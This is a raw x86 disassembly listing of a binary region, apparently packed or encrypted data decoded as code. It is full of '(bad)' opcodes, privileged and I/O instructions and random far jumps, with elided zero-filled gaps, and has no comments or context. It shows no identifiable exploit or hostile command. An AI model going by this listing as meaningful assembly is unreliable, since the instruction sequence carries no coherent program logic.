  4257a8:	mov    ebp,0x7356e6a4
  4257ad:	cwde   
  4257ae:	mov    dh,bh
  4257b0:	paddusb mm6,QWORD PTR [ecx-0x6b]
  4257b4:	cmp    al,0x1f
  4257b6:	xor    ebx,edi
  4257b8:	aas    
  4257b9:	jmp    0x4257d8
  4257bb:	(bad)  
  4257bc:	lock std 
  4257be:	gs popa 
  4257c0:	xor    al,0x8a
  4257c2:	or     al,BYTE PTR [eax+edi*1]
  4257c5:	ins    BYTE PTR es:[edi],dx
  4257c6:	stos   DWORD PTR es:[edi],eax
  4257c7:	mov    edi,0x6fd10076
  4257cc:	(bad)  
  4257cd:	push   ebp
  4257ce:	repz mov ebp,DWORD PTR [edx-0x2d722cb]
  4257d5:	mov    dh,0xa6
  4257d7:	mov    eax,ds:0xb181157f
  4257dc:	shl    DWORD PTR [edi],1
  4257de:	dec    BYTE PTR [edx+edi*8]
  4257e1:	push   edx
  4257e2:	(bad)  
  4257e3:	xchg   ebp,eax
  4257e4:	mov    dl,0x31
  4257e6:	test   esi,0x582d13ff
  4257ec:	addr16 mov dl,0x56
  4257ef:	xchg   BYTE PTR [ebx],al
  4257f1:	(bad)  
  4257f2:	(bad)  
  4257f3:	inc    ecx
  4257f4:	in     eax,dx
  4257f5:	inc    esi
  4257f6:	ss test al,0x13
  4257f9:	(bad)  
  4257fa:	scas   eax,DWORD PTR es:[edi]
  4257fb:	push   0x9e90739e
  425800:	and    eax,0x5f83077c
  425805:	xchg   esp,eax
  425806:	pop    ss
  425807:	fwait
  425808:	xor    DWORD PTR [edx+0x5a],0xffffffd0
  42580c:	iret   
  42580d:	inc    ebx
  42580e:	dec    eax
  42580f:	dec    ebp
  425810:	mov    bh,0x10
  425812:	in     eax,0x58
  425814:	jnp    0x42585e
  425816:	add    esp,DWORD PTR [ebx+0x410de3e0]
  42581c:	fild   DWORD PTR [eax-0x41f4e72e]
  425822:	xor    BYTE PTR [ecx+0x2dbdda],bh
  425828:	fldcw  WORD PTR [edx+0x26]
  42582b:	sahf   
  42582c:	leave  
  42582d:	bndstx [ecx+0x6],(bad)
  425831:	sub    bl,BYTE PTR [eax-0x2501cea5]
  425837:	add    ebx,esp
  425839:	icebp  
  42583a:	mov    cl,0x64
  42583c:	loop   0x42584e
  42583e:	pop    edx
  42583f:	cmp    DWORD PTR [ebx+ebx*4+0x1a161abb],0x3
  425847:	cs gs (bad) 
  42584a:	icebp  
  42584b:	or     DWORD PTR [eax-0x40],ebx
  42584e:	pop    es
  42584f:	popa   
  425850:	aad    0xda
  425852:	mov    ecx,0x3a2f9e7
  425857:	dec    esp
  425858:	mov    bh,0x76
  42585a:	xor    ch,BYTE PTR [edx+0x39]
  42585d:	rep lods al,BYTE PTR ds:[esi]
  42585f:	pop    ebp
  425860:	and    eax,0x50614345
  425865:	and    al,BYTE PTR [edx-0x46bfe7b9]
  42586b:	inc    ecx
  42586c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42586d:	cld    
  42586e:	mov    ch,0x86
  425870:	call   0x6e6a:0x402a99ca
  425877:	mov    al,0x1f
  425879:	push   ecx
  42587a:	cmp    eax,0x53739242
  42587f:	fwait
  425880:	ins    DWORD PTR es:[edi],dx
  425881:	repz std 
  425883:	jmp    0x425901
  425885:	push   ebp
  425886:	or     BYTE PTR ds:0x8fa45256,ah
  42588c:	loop   0x425892
  42588e:	push   ss
  42588f:	daa    
  425890:	sub    DWORD PTR [eax],eax
	...
  4258f2:	add    BYTE PTR [eax],al
  4258f4:	pop    esp
  4258f5:	push   edx
  4258f6:	nop
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	jb     0x425940
  425902:	jno    0x4258fa
  425904:	mov    BYTE PTR [ecx+0x1050001],dl
  42590a:	add    BYTE PTR [eax],al
  42590c:	ficomp DWORD PTR [eax]
  42590e:	push   cs
  42590f:	dec    ebp
  425910:	cmp    eax,0x9d30bbe3
  425915:	sbb    eax,0x85ccf7eb
  42591a:	lahf   
  42591b:	loop   0x42589e
  42591d:	push   eax
  42591e:	dec    edx
  42591f:	dec    edx
  425920:	push   edx
  425921:	cmp    edi,DWORD PTR [edi+eiz*1]
  425924:	sbb    cl,BYTE PTR ds:0xd1235198
  42592a:	hlt    
  42592b:	and    BYTE PTR [eax-0x3cf7e40],ch
  425931:	push   esp
  425932:	call   0xb3ef:0x4d195ce0
  425939:	in     eax,dx
  42593a:	out    dx,al
  42593b:	xor    DWORD PTR es:[esi-0x2162e994],0xf8b47176
  425946:	sbb    ah,0x8d
  425949:	push   ss
  42594a:	push   ecx
  42594b:	adc    dh,BYTE PTR [ecx]
  42594d:	inc    edx
  42594e:	push   edx
  42594f:	out    0xf7,eax
  425951:	xor    al,0xb3
  425953:	ret    
  425954:	cmp    eax,0x4424889d
  425959:	dec    eax
  42595a:	inc    esi
  42595b:	cld    
  42595c:	mov    bl,0x27
  42595e:	leave  
  42595f:	adc    esi,DWORD PTR [ecx-0x3f7f3995]
  425965:	mov    edi,DWORD PTR [esi+0x2a40a74b]
  42596b:	pop    esi
  42596c:	fs fcmovnbe st,st(2)
  42596f:	ret    
  425970:	cmp    al,BYTE PTR [eax-0x37]
  425973:	pop    ecx
  425974:	pop    ebp
  425975:	test   eax,0x87bd543c
  42597a:	mov    ds:0x1d68e03,eax
  42597f:	aas    
  425980:	sbb    DWORD PTR fs:[ebx+0x4c],eax
  425984:	fs jmp 0x425963
  425987:	inc    eax
  425988:	in     al,0xa
  42598a:	add    dh,BYTE PTR [edi]
  42598c:	fnstenv [ebx-0x2cea3258]
  425992:	popf   
  425993:	inc    esp
  425994:	in     eax,dx
  425995:	daa    
  425996:	ds xchg ebp,eax
  425998:	mov    esi,0x749a5ab8
  42599d:	xor    edx,edi
  42599f:	jnp    0x4259ff
  4259a1:	neg    BYTE PTR [esp+ecx*4-0x12]
  4259a5:	cmc    
  4259a6:	icebp  
  4259a7:	add    eax,0x50c33df4
  4259ac:	and    eax,0x82853d3d
  4259b1:	dec    eax
  4259b2:	in     eax,dx
  4259b3:	(bad)  
  4259b4:	mov    bh,0x14
  4259b6:	cmp    dl,cl
  4259b8:	stc    
  4259b9:	dec    ebp
  4259ba:	dec    ebx
  4259bb:	fstp   QWORD PTR [esi]
  4259bd:	xchg   edi,eax
  4259be:	inc    ebx
  4259bf:	dec    edi
  4259c0:	mov    esp,0xcc6ed505
  4259c5:	xor    esp,DWORD PTR [edi-0x2d]
  4259c8:	and    BYTE PTR [ebp+esi*1+0x4b],ch
  4259cc:	jecxz  0x4259b1
  4259ce:	rcl    DWORD PTR [ebx-0x2707d464],0x8d
  4259d5:	jg     0xaaace82a
  4259db:	int    0x68
  4259dd:	mov    ss,WORD PTR [esi]
  4259df:	cmp    DWORD PTR [ecx-0x6af78033],esi
  4259e5:	mov    al,ds:0x2c6d24bf
  4259ea:	fwait
  4259eb:	jnp    0x425a4c
  4259ed:	push   ebp
  4259ee:	inc    esi
  4259ef:	scas   eax,DWORD PTR es:[edi]
  4259f0:	lahf   
  4259f1:	ficomp DWORD PTR [edi]
  4259f3:	and    bl,BYTE PTR [edx+0x15d26789]
  4259f9:	sub    esi,ebp
  4259fb:	cmp    DWORD PTR ds:0x968a9b,edx
  425a01:	repz imul edi,DWORD PTR [ebx-0x5b],0xffffff85
  425a06:	add    dl,BYTE PTR [ecx]
  425a08:	imul   edi,DWORD PTR [eax+0xa],0x79
  425a0c:	iret   
  425a0d:	mov    ds:0xeb148d,eax
	...
  425a72:	add    BYTE PTR [eax],al
  425a74:	shl    DWORD PTR [ebx+0x4],0x67
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4+0x4d8e660d]
  425a84:	lea    edx,[edx+0x1050001]
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	fwait
  425a8d:	ss jge 0x425adf
  425a90:	jg     0x425af6
  425a92:	jne    0x425a95
  425a94:	call   0x7d41:0xade74b5b
  425a9b:	popf   
  425a9c:	dec    esp
  425a9d:	and    dl,bl
  425a9f:	and    dl,cl
  425aa1:	mov    dl,0x85
  425aa3:	int3   
  425aa4:	(bad)  
  425aa5:	adc    eax,0x936aeda2
  425aaa:	xchg   edx,eax
  425aab:	dec    edi
  425aac:	scas   al,BYTE PTR es:[edi]
  425aad:	pusha  
  425aae:	fdiv   QWORD PTR [ecx-0x3f]
  425ab1:	and    eax,0xade61674
  425ab6:	mov    ch,0xfb
  425ab8:	mov    esp,0xde814b8c
  425abd:	aas    
  425abe:	in     eax,0xae
  425ac0:	gs aad 0x61
  425ac3:	aaa    
  425ac4:	xchg   esp,eax
  425ac5:	inc    edx
  425ac6:	cwde   
  425ac7:	xor    eax,ecx
  425ac9:	xchg   edi,eax
  425aca:	(bad)  
  425acb:	outs   dx,DWORD PTR ds:[esi]
  425acc:	sbb    cl,BYTE PTR [ebx-0x6b]
  425acf:	test   eax,0x1baf8ec7
  425ad4:	jno    0x425a68
  425ad6:	dec    esi
  425ad7:	cmp    DWORD PTR [ebp+0x4c],ebx
  425ada:	cmp    eax,0x1b9eed7a
  425adf:	daa    
  425ae0:	lahf   
  425ae1:	(bad)  [esi]
  425ae3:	xor    al,0x96
  425ae5:	mov    al,ds:0x603d5c9d
  425aea:	xor    eax,0x234965c5
  425aef:	xchg   edx,eax
  425af0:	and    BYTE PTR [eax+0x7f8f1603],dh
  425af6:	push   ss
  425af7:	push   0x21680333
  425afc:	xlat   BYTE PTR ds:[ebx]
  425afd:	cmc    
  425afe:	test   BYTE PTR [esi-0x7f],bl
  425b01:	ret    
  425b02:	or     al,0x2
  425b04:	add    BYTE PTR [eax-0x25],ch
  425b07:	sub    BYTE PTR [edi-0x6fca7b5d],cl
  425b0d:	sbb    eax,0xa6325cf0
  425b12:	ret    0x9195
  425b15:	call   0xcda1:0x37feb4d1
  425b1c:	(bad)  
  425b1d:	out    dx,eax
  425b1e:	lgs    ebp,FWORD PTR [esp+ebp*1-0x21]
  425b23:	xchg   edi,eax
  425b24:	or     dh,BYTE PTR [ebp+0x3c5f8737]
  425b2a:	dec    ebx
  425b2b:	scas   al,BYTE PTR es:[edi]
  425b2c:	aad    0x26
  425b2e:	lea    eax,[edi+0x245034dc]
  425b34:	cmp    eax,0x97e7af91
  425b39:	mov    ecx,0xa67e3fd1
  425b3e:	and    esp,0x43
  425b41:	push   ecx
  425b42:	or     al,bh
  425b44:	xor    BYTE PTR [ecx+0x719b49a1],0x7b
  425b4b:	sbb    esp,DWORD PTR ds:[ebp+0x6136b1c9]
  425b52:	add    al,0x2e
  425b54:	or     al,0xc1
  425b56:	adc    DWORD PTR [ecx+0x14],ebx
  425b59:	arpl   cx,dx
  425b5b:	and    cl,BYTE PTR [eax]
  425b5d:	xchg   edx,eax
  425b5e:	sbb    al,0xbc
  425b60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b61:	adc    BYTE PTR [eax+0x3a5dc01],dl
  425b67:	and    al,BYTE PTR ds:0xf7a7bb81
  425b6d:	popf   
  425b6e:	loope  0x425bb9
  425b70:	mov    bl,0x1e
  425b72:	xsaveopt [ecx+0x1a]
  425b76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b77:	xor    al,0xd1
  425b79:	push   0x69b35c0b
  425b7e:	repz int3 
  425b80:	xor    ah,bh
  425b82:	add    DWORD PTR [edi+eax*4],edx
  425b85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b86:	xchg   edx,eax
  425b87:	and    eax,0x2ee775f3
  425b8c:	dec    edi
  425b8d:	outs   dx,DWORD PTR ds:[esi]
  425b8e:	add    al,0x95
  425b90:	add    DWORD PTR [eax],eax
	...
  425bf2:	add    BYTE PTR [eax],al
  425bf4:	(bad)  
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	add    eax,0x92167501
  425c05:	xchg   ebx,eax
  425c06:	add    DWORD PTR [eax],eax
  425c08:	add    eax,0xb2000001
  425c0d:	fmul   QWORD PTR [esi-0x11a2dec8]
  425c13:	jecxz  0x425c3c
  425c15:	in     eax,dx
  425c16:	or     ebx,esp
  425c18:	iret   
  425c19:	lods   eax,DWORD PTR ds:[esi]
  425c1a:	xchg   ebp,eax
  425c1b:	rcl    ecx,1
  425c1d:	dec    esi
  425c1e:	push   cs
  425c1f:	push   edx
  425c20:	rol    BYTE PTR [esi-0x23f039f2],1
  425c26:	addr16 enter 0x3a,0x4
  425c2b:	ss sahf 
  425c2d:	frstor [eax+ebx*1-0x4308b429]
  425c34:	cli    
  425c35:	xchg   edi,eax
  425c36:	(bad)  
  425c38:	push   cs
  425c39:	jp     0x425bde
  425c3b:	inc    esp
  425c3c:	and    BYTE PTR [ebp+ebp*4-0x78e1b950],ah
  425c43:	in     al,dx
  425c44:	dec    edx
  425c45:	jmp    0xb139c156
  425c4a:	out    dx,al
  425c4b:	inc    esp
  425c4c:	jl     0x425bdf
  425c4e:	daa    
  425c4f:	mov    bl,0x6b
  425c51:	xchg   esi,eax
  425c52:	jne    0x425bf3
  425c54:	popf   
  425c55:	pop    ss
  425c56:	fst    QWORD PTR [ebx+0x27]
  425c59:	mov    al,ds:0x7a0fc970
  425c5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c5f:	push   esi
  425c60:	(bad)  
  425c61:	popa   
  425c62:	cmp    BYTE PTR [ecx],0xb4
  425c65:	(bad)  
  425c66:	cwde   
  425c67:	jnp    0x425c1b
  425c69:	addr16 add al,0x84
  425c6c:	cmp    bh,BYTE PTR ds:0x7d3728d0
  425c72:	loope  0x425c11
  425c74:	cs xchg edi,eax
  425c76:	xchg   bl,bl
  425c78:	xchg   edi,eax
  425c79:	aaa    
  425c7a:	and    eax,0xb9768aa1
  425c7f:	push   0xffffffcb
  425c81:	add    eax,0x2e11f9a0
  425c86:	sbb    bl,BYTE PTR [eax]
  425c88:	xchg   edx,eax
  425c89:	jo     0x425cfb
  425c8b:	mov    ecx,ds
  425c8d:	hlt    
  425c8e:	icebp  
  425c8f:	push   ebx
  425c90:	les    edi,FWORD PTR [edi-0x56]
  425c93:	cmp    dl,BYTE PTR [edx+0x63]
  425c96:	scas   eax,DWORD PTR es:[edi]
  425c97:	mov    bl,0xfb
  425c99:	das    
  425c9a:	mov    esi,ss
  425c9c:	icebp  
  425c9d:	rcl    ebp,cl
  425c9f:	jno    0x425c54
  425ca1:	fs das 
  425ca3:	mov    esi,0xce2a9fad
  425ca8:	mov    ah,0x7e
  425caa:	lea    edi,[eax-0xd3dda7f]
  425cb0:	(bad)  
  425cb1:	xor    edi,DWORD PTR [ecx-0x39ad992]
  425cb7:	xchg   ebp,edx
  425cb9:	sahf   
  425cba:	xchg   esi,eax
  425cbb:	jns    0x425c93
  425cbd:	cmp    al,0xcb
  425cbf:	or     al,0xec
  425cc1:	push   edi
  425cc2:	sub    ebx,esi
  425cc4:	cli    
  425cc5:	sbb    al,0x86
  425cc7:	add    edx,DWORD PTR es:[edx+0x39]
  425ccb:	mov    bl,0xb5
  425ccd:	and    esp,ebx
  425ccf:	mov    dh,0xaa
  425cd1:	add    eax,0xa50b7d01
  425cd6:	div    BYTE PTR [ebx-0x4c]
  425cd9:	pop    esp
  425cda:	inc    edi
  425cdb:	push   cs
  425cdc:	cmc    
  425cdd:	cmp    eax,0x2d0c1c8c
  425ce2:	cmp    ecx,edi
  425ce4:	enter  0x3edf,0x65
  425ce8:	mov    DWORD PTR [ebp+0x195d6de5],ebx
  425cee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425cef:	in     eax,dx
  425cf0:	xchg   ecx,eax
  425cf1:	pop    ebp
  425cf2:	cdq    
  425cf3:	sub    al,0xd3
  425cf5:	ret    0x10f5
  425cf8:	shl    DWORD PTR [edx],0xa8
  425cfb:	push   es
  425cfc:	sub    esp,DWORD PTR [ebx+0x1b]
  425cff:	push   0x737c6790
  425d04:	jo     0x425d49
  425d06:	pop    ds
  425d07:	add    ch,BYTE PTR [esi+0x4a41d4fa]
  425d0d:	sbb    al,0x58
  425d0f:	stos   BYTE PTR es:[edi],al
  425d10:	out    dx,eax
	...
  425d71:	add    BYTE PTR [eax],al
  425d73:	add    bh,bh
  425d75:	lods   al,BYTE PTR ds:[esi]
  425d76:	fadd   QWORD PTR [edi]
  425d78:	fbstp  TBYTE PTR [edi-0x1]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0x2be42b15,al
  425d84:	xchg   edi,eax
  425d85:	xchg   esp,eax
  425d86:	add    DWORD PTR [eax],eax
  425d88:	add    eax,0x1000001
  425d8d:	add    DWORD PTR [edx],esp
  425d8f:	vaddpd xmm6,xmm5,xmm2
  425d93:	adc    al,BYTE PTR [esi-0x1c]
  425d96:	jns    0x425e07
  425d98:	(bad)  
  425d99:	sti    
  425d9a:	mov    esi,0x8f5675f7
  425d9f:	call   FWORD PTR [eax+edx*2-0x7f]
  425da3:	sub    esp,ecx
  425da5:	and    eax,0x9a29483c
  425daa:	mov    al,BYTE PTR [edx-0x9]
  425dad:	xchg   ebp,eax
  425dae:	jmp    0x425dff
  425db0:	mov    bl,0x55
  425db2:	inc    ecx
  425db3:	jp     0x425d58
  425db5:	cmp    eax,0x10378d5e
  425dba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425dbb:	mov    edi,0x2b9ca140
  425dc0:	push   cs
  425dc1:	shl    BYTE PTR [ebx-0x26],0x5e
  425dc5:	into   
  425dc6:	pop    es
  425dc7:	mov    BYTE PTR [edx-0x38],bl
  425dca:	cmp    edx,ecx
  425dcc:	push   eax
  425dcd:	in     eax,dx
  425dce:	jbe    0x425d97
  425dd0:	xchg   ebx,eax
  425dd1:	pop    esi
  425dd2:	mov    dl,0xe0
  425dd4:	sti    
  425dd5:	or     edi,DWORD PTR [edx+0x1a4cfeaf]
  425ddb:	fmul   QWORD PTR [ebx+0x88fa019]
  425de1:	lea    ecx,[edi]
  425de3:	test   BYTE PTR [esi],dl
  425de5:	cmp    DWORD PTR [ecx+0x10],ebx
  425de8:	sbb    eax,edi
  425dea:	(bad)  
  425deb:	pop    edi
  425dec:	mov    cs,WORD PTR [ebp+0x786a7359]
  425df2:	sar    ebp,0xea
  425df5:	ror    BYTE PTR ds:0xa47f13cd,1
  425dfc:	xor    al,0x88
  425dfe:	cs (bad) 
  425e00:	dec    eax
  425e01:	mov    bh,0xd7
  425e03:	ds inc edx
  425e05:	push   es
  425e06:	mov    eax,0x220aa97
  425e0b:	out    dx,al
  425e0c:	xor    bl,BYTE PTR [ebx+0x1e2f8ee1]
  425e12:	inc    edx
  425e13:	scas   eax,DWORD PTR es:[edi]
  425e14:	fwait
  425e15:	pop    ss
  425e16:	push   es
  425e17:	clc    
  425e18:	mov    eax,ds:0x52e2b46d
  425e1d:	pop    si
  425e1f:	adc    al,0x39
  425e21:	mov    bh,0x53
  425e23:	jle    0x425de1
  425e25:	pop    ds
  425e26:	push   eax
  425e27:	icebp  
  425e28:	sub    al,0xc9
  425e2b:	inc    esp
  425e2c:	ret    
  425e2d:	xchg   esp,eax
  425e2e:	cmp    eax,0xdc62147d
  425e33:	fiadd  DWORD PTR [edi]
  425e35:	dec    eax
  425e36:	imul   ecx,DWORD PTR ds:0xc8048fbc,0x7b42c24c
  425e40:	shl    BYTE PTR [esi+eax*8+0xb],0x7
  425e45:	ss ret 0xd0ff
  425e49:	mov    WORD PTR [ecx+edx*8-0x3270330f],ss
  425e50:	add    al,0x28
  425e52:	sbb    ebp,DWORD PTR [ebx]
  425e54:	int3   
  425e55:	adc    esp,DWORD PTR [eax+0x62]
  425e58:	push   eax
  425e59:	or     BYTE PTR [ecx-0xf],bh
  425e5c:	and    esp,DWORD PTR [edx-0x6e9f6eb3]
  425e62:	sub    dl,ch
  425e64:	daa    
  425e65:	cmp    DWORD PTR [ebp+edx*4+0x15],0x62
  425e6a:	pushf  
  425e6b:	dec    ebx
  425e6c:	jo     0x425e98
  425e6e:	aaa    
  425e6f:	jo     0x425e89
  425e71:	jns    0x425e9f
  425e73:	cli    
  425e74:	add    BYTE PTR [esp+edi*2],bl
  425e77:	fnstcw WORD PTR [eax-0x24]
  425e7a:	arpl   WORD PTR [edi],bp
  425e7c:	add    eax,0xd9416bb4
  425e81:	jb     0x425e7b
  425e83:	mov    ds:0x12bdd326,eax
  425e88:	sub    BYTE PTR [ecx-0x7a],bl
  425e8b:	inc    esp
  425e8c:	rcl    DWORD PTR [ecx+0x90a4a6],1
	...
  425ef2:	add    BYTE PTR [eax],al
  425ef4:	(bad)  
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	pusha  
  425f01:	xchg   DWORD PTR [esi+0x1959c5a],eax
  425f07:	add    BYTE PTR ds:0x2a000001,al
  425f0d:	push   0x21
  425f0f:	ret    
  425f10:	sbb    BYTE PTR [esi],dh
  425f12:	adc    DWORD PTR [edx],ecx
  425f14:	or     dh,ah
  425f16:	and    bh,bh
  425f18:	jmp    0xd593:0xcc69a8a2
  425f1f:	mov    ch,BYTE PTR [ecx-0x7606fcea]
  425f25:	mov    cl,0xa0
  425f27:	mov    dl,0x88
  425f29:	(bad)  
  425f2a:	mov    edi,0xfac81450
  425f2f:	push   0x35355e1c
  425f34:	stos   DWORD PTR es:[edi],eax
  425f35:	fwait
  425f36:	out    dx,al
  425f37:	xchg   esi,eax
  425f38:	rcl    BYTE PTR [edx-0x14],0x8b
  425f3c:	push   esp
  425f3d:	ror    DWORD PTR [esi-0x3abe71aa],1
  425f43:	outs   dx,BYTE PTR ds:[esi]
  425f44:	mov    ebp,ss
  425f46:	dec    edi
  425f47:	xchg   ecx,eax
  425f48:	push   edx
  425f49:	fnstsw WORD PTR [edi-0x76]
  425f4c:	xor    ch,BYTE PTR [esi]
  425f4e:	popf   
  425f4f:	(bad)  
  425f50:	cmp    bl,dh
  425f52:	das    
  425f53:	test   eax,0xace8de16
  425f58:	push   ss
  425f59:	scas   eax,DWORD PTR es:[edi]
  425f5a:	dec    ecx
  425f5b:	loop   0x425f7d
  425f5d:	lock or bh,BYTE PTR [edx+0x43553f2c]
  425f64:	xchg   edx,eax
  425f65:	sbb    dl,BYTE PTR [ebx-0x3580d6c5]
  425f6b:	sbb    eax,0x925f037a
  425f70:	loop   0x425fc6
  425f72:	sbb    DWORD PTR [edi+0x3c],edx
  425f75:	dec    edi
  425f76:	xchg   esp,eax
  425f77:	jle    0x425f77
  425f79:	mov    esp,0xa1c885f8
  425f7e:	lods   eax,DWORD PTR ds:[esi]
  425f7f:	jnp    0x425fe3
  425f81:	push   edx
  425f82:	mov    bl,0x7f
  425f84:	xor    al,0x19
  425f86:	or     eax,0x45623e2
  425f8b:	mov    bl,0x64
  425f8d:	in     al,0x61
  425f8f:	cs jnp 0x425fd6
  425f92:	iret   
  425f93:	inc    ebp
  425f94:	pusha  
  425f95:	pop    edi
  425f96:	mov    ds:0x663d575d,al
  425f9b:	in     eax,0xf5
  425f9d:	xor    edi,esp
  425f9f:	sar    ch,0x97
  425fa2:	mov    ch,BYTE PTR [edi]
  425fa4:	adc    edx,ebx
  425fa6:	push   es
  425fa7:	adc    bl,ah
  425fa9:	jmp    0xb5a2:0xdfa81739
  425fb0:	cmp    DWORD PTR [ecx+0x7],0x2a
  425fb4:	dec    edx
  425fb5:	mov    eax,ds:0xa131575
  425fba:	xchg   esi,eax
  425fbb:	xlat   BYTE PTR ds:[ebx]
  425fbc:	mov    WORD PTR ds:0x13a345e8,ss
  425fc2:	pop    eax
  425fc3:	adc    BYTE PTR [edi+eiz*8+0x54cf6a6b],dh
  425fca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425fcb:	outs   dx,DWORD PTR ds:[esi]
  425fcc:	sub    BYTE PTR [ecx],bl
  425fce:	in     eax,0x23
  425fd0:	mov    dh,BYTE PTR [edi+0x32d41c40]
  425fd6:	adc    BYTE PTR [ecx+0x65],cl
  425fd9:	xchg   ebx,eax
  425fda:	test   WORD PTR [esi-0x1e056aaa],dx
  425fe1:	stos   BYTE PTR es:[edi],al
  425fe2:	mov    eax,es
  425fe4:	or     DWORD PTR [edi-0x44],ebx
  425fe7:	es gs fwait
  425fea:	dec    eax
  425feb:	add    DWORD PTR [edx-0x14ff3b9d],ebp
  425ff1:	(bad)  
  425ff2:	push   0x5d3f81e8
  425ff7:	add    al,al
  425ff9:	or     ch,cl
  425ffb:	pop    eax
  425ffc:	(bad)  
  425ffd:	pusha  
  425ffe:	les    eax,FWORD PTR [eax]
  426000:	imul   ecx,DWORD PTR es:0x2560d2f8,0x5bf81ecd
  42600b:	imul   esi,DWORD PTR [edi],0xffffffcb
  42600e:	mov    bl,0x6e
  426010:	cld    
	...
  426071:	add    BYTE PTR [eax],al
  426073:	add    BYTE PTR [ecx],bh
  426075:	cwde   
  426076:	or     eax,DWORD PTR [esi]
  426078:	stos   DWORD PTR es:[edi],eax
  426079:	xchg   edi,eax
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	mov    ebp,0xa1a3d998
  426085:	xchg   esi,eax
  426086:	add    DWORD PTR [eax],eax
  426088:	add    eax,0x73000001
  42608d:	and    esp,esi
  42608f:	in     eax,0x76
  426091:	inc    eax
  426092:	sahf   
  426093:	aad    0xd1
  426095:	cdq    
  426096:	push   ax
  426098:	xor    BYTE PTR [ecx-0x70d08426],ah
  42609e:	pop    eax
  42609f:	xor    eax,0x10b6f8d1
  4260a4:	jo     0x4260c2
  4260a6:	inc    ebx
  4260a7:	bound  ecx,QWORD PTR [esp+ebx*8+0x5f]
  4260ab:	outs   dx,DWORD PTR ds:[esi]
  4260ac:	and    eax,0x58d5292
  4260b1:	xchg   BYTE PTR [edx+ecx*4],bh
  4260b4:	test   DWORD PTR [edx+0x59ca183e],edx
  4260ba:	add    ecx,esi
  4260bc:	shr    ch,1
  4260be:	add    BYTE PTR [ebx],ah
  4260c0:	nop
  4260c1:	sbb    BYTE PTR [eax-0x4d01d66b],0x38
  4260c8:	shr    ecx,0xfd
  4260cb:	xor    eax,0x8b56f55d
  4260d0:	(bad)  
  4260d2:	add    ebp,esi
  4260d4:	enter  0x7386,0xbe
  4260d8:	pop    edx
  4260d9:	out    0xb0,al
  4260db:	push   eax
  4260dc:	and    bh,ch
  4260de:	jmp    0x987e:0x93577927
  4260e5:	int3   
  4260e6:	scas   al,BYTE PTR es:[edi]
  4260e7:	inc    ecx
  4260e8:	dec    esi
  4260e9:	lds    ebp,FWORD PTR [eax+0x4b3ccd83]
  4260ef:	mov    al,ds:0x740dd01f
  4260f4:	push   ebx
  4260f5:	popa   
  4260f6:	dec    ebp
  4260f7:	mov    esp,0x26ebdf72
  4260fc:	jl     0x426124
  4260fe:	mov    ah,0x2a
  426100:	outs   dx,DWORD PTR ds:[esi]
  426101:	sar    dl,cl
  426103:	mov    edi,DWORD PTR [eax-0x1e0d3c48]
  426109:	dec    esp
  42610a:	(bad)  
  42610b:	scas   eax,DWORD PTR es:[edi]
  42610c:	out    dx,eax
  42610d:	cmp    DWORD PTR [edi+0x2a9e9f17],edi
  426113:	stos   DWORD PTR es:[edi],eax
  426114:	cmp    dl,BYTE PTR [ebx-0x6324b7f9]
  42611a:	cwde   
  42611b:	add    bh,BYTE PTR [esi+0x822f3ce]
  426121:	cmp    DWORD PTR [ecx-0x54d28484],esi
  426127:	dec    eax
  426128:	popf   
  426129:	adc    eax,0x901ed71c
  42612e:	or     DWORD PTR [esi-0x4c],edx
  426131:	pusha  
  426132:	ss cmp eax,0x32ab5a57
  426138:	lahf   
  426139:	(bad)  [eax]
  42613b:	mov    dl,0xbf
  42613d:	fdiv   QWORD PTR [esi+0x6150282]
  426143:	mov    ebx,DWORD PTR [ebp+esi*8+0x7d354767]
  42614a:	xchg   ebp,eax
  42614b:	cmp    eax,DWORD PTR [eax-0x33]
  42614e:	test   al,0x5d
  426150:	jmp    FWORD PTR [esi]
  426152:	repnz and DWORD PTR [edi],edx
  426155:	leave  
  426156:	xchg   esp,eax
  426157:	repnz mov ds:0xc8503182,eax
  42615d:	dec    ebx
  42615e:	std    
  42615f:	fnstcw WORD PTR [ebx+0x75]
  426162:	mov    dl,0xee
  426164:	test   DWORD PTR [eax+0x77],esi
  426167:	inc    esp
  426168:	pusha  
  426169:	inc    esi
  42616a:	adc    edx,DWORD PTR [eax+0x36]
  42616d:	push   edx
  42616e:	data16 or dl,BYTE PTR [ecx-0x640847bb]
  426175:	jge    0x426183
  426177:	xchg   BYTE PTR [ebp+0x25fd229f],bl
  42617d:	fadd   DWORD PTR [eax-0xd53c5f1]
  426183:	sbb    eax,0x295c79e7
  426188:	in     al,dx
  426189:	repnz mov ah,cl
  42618c:	xor    ebp,eax
  42618e:	jp     0x4261af
  426190:	pop    eax
	...
  4261f1:	add    BYTE PTR [eax],al
  4261f3:	add    BYTE PTR [ebx-0x409ef0df],bl
  4261f9:	outs   dx,DWORD PTR ds:[esi]
  4261fa:	(bad)  
  4261fb:	sti    
  4261fc:	mov    bh,0x83
  4261fe:	mov    cl,0x27
  426200:	cmp    eax,0xa66aea8a
  426205:	xchg   edi,eax
  426206:	add    DWORD PTR [eax],eax
  426208:	add    eax,0xac000001
  42620d:	pop    ebp
  42620e:	ffreep st(4)
